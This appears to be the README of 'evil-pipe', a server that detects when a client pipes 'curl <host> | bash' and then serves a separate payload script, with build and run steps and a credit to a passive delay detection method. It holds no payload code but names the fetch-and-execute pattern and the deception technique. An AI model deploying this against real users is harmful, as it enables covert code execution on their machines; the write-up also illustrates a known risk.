# evil-pipe

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)



![Demo](https://raw.githubusercontent.com/4iar/evil-pipe/assets/demo.gif)

## Build

```bash
$ mkdir build && cd build
$ cmake ..
$ make
```

## Usage

Payload scripts are read from two files:


| File | When it is sent |
|----------|-------------|
| pipe_payload.txt |  curl <host> \| bash |
| non_pipe_payload.txt |   curl <host> |

After configuring the payloads, start the server with a port

```bash
$ ./evil-pipe <port>
```


## Acknowledgements

Uses [Phil's passive delay method](https://web.archive.org/web/20170718181413/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/).
